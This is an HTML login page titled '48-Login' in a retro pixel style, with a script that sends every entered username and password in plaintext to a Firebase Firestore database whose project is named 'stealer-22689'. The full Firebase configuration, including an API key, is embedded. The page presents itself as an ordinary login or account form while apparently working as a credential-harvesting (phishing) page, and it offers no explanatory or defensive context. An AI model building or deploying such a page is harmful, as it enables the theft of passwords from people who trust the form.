<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>48-Login</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
  body {
    background: #0b0c2a;
    color: #00f0ff;
    font-family: 'Press Start 2P', cursive;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    margin: 0;
    user-select: none;
  }
  h1 {
    font-size: 2rem;
    color: #00aaff;
    text-shadow:
      1px 1px 0 #000,
      2px 2px 0 #001133;
    margin-bottom: 1rem;
  }
  .login-box {
    background: #050822;
    border: 4px solid #002244;
    padding: 20px;
    width: 320px;
    box-shadow:
      0 0 10px #00aaff,
      inset 0 0 15px #001122;
    image-rendering: pixelated;
  }
  input {
    width: 100%;
    padding: 10px;
    margin: 8px 0;
    background: #000a1f;
    border: 2px solid #004477;
    color: #00aaff;
    font-family: 'Press Start 2P', cursive;
    font-size: 0.7rem;
    text-shadow: 1px 1px 0 #000;
    outline: none;
    caret-color: #00ffff;
  }
  input::placeholder {
    color: #003355;
  }
  input:focus {
    border-color: #00ffff;
    box-shadow: 0 0 5px #00ffff;
  }
  button {
    width: 100%;
    background: #001122;
    border: 3px solid #00aaff;
    color: #00ccff;
    padding: 12px;
    font-family: 'Press Start 2P', cursive;
    font-size: 0.8rem;
    cursor: pointer;
    user-select: none;
    text-shadow: 1px 1px 0 #000;
    transition: background 0.3s ease;
  }
  button:hover {
    background: #003366;
    border-color: #00ffff;
  }
  #message {
    margin-top: 1rem;
    font-size: 0.7rem;
    color: #00aaff;
    min-height: 1.2rem;
    text-align: center;
    text-shadow: 1px 1px 0 #000;
  }
</style>
</head>
<body>
  <h1>48-Login</h1>
  <div class="login-box">
    <input type="text" id="username" placeholder="USERNAME" autocomplete="username" />
    <input type="password" id="password" placeholder="PASSWORD" autocomplete="current-password" />
    <button id="saveBtn">Save Credentials</button>
    <div id="message"></div>
  </div>

  <script type="module">
    import { initializeApp } from "https://unpkg.com/firebase@9.24.0/app/dist/index.esm.js";
    import { 
      getFirestore, 
      collection, 
      addDoc, 
      query, 
      where, 
      getDocs 
    } from "https://unpkg.com/firebase@9.24.0/firestore/dist/index.esm.js";

    const firebaseConfig = {
      apiKey: "AIzaSyAQlPoupRMYE9_4Sli4-ZFjGJEyhnJWpQU",
      authDomain: "stealer-22689.firebaseapp.com",
      projectId: "stealer-22689",
      storageBucket: "stealer-22689.firebasestorage.app",
      messagingSenderId: "794872608041",
      appId: "1:794872608041:web:931ab0b75aee3ec67c7338",
      measurementId: "G-HTDSYH71XK"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
    const saveBtn = document.getElementById("saveBtn");
    const messageDiv = document.getElementById("message");

    function showMessage(msg, error = false) {
      messageDiv.textContent = msg;
      messageDiv.style.color = error ? "#ff4444" : "#00aaff";
    }

    saveBtn.addEventListener("click", async () => {
      const username = usernameInput.value.trim();
      const password = passwordInput.value.trim();

      if (!username || !password) {
        showMessage("Please enter username and password.", true);
        return;
      }

      showMessage("Checking username availability...");

      try {
        const usersRef = collection(db, "users");
        const q = query(usersRef, where("username", "==", username));
        const querySnapshot = await getDocs(q);

        if (!querySnapshot.empty) {
          showMessage("Username already taken, try a different one.", true);
          return;
        }

        await addDoc(usersRef, {
          username: username,
          password: password,
          createdAt: new Date().toISOString()
        });

        showMessage("Credentials saved successfully!");
        usernameInput.value = "";
        passwordInput.value = "";
      } catch (error) {
        showMessage("Error: " + error.message, true);
        console.error("Firestore error:", error);
      }
    });
  </script>
</body>
</html>
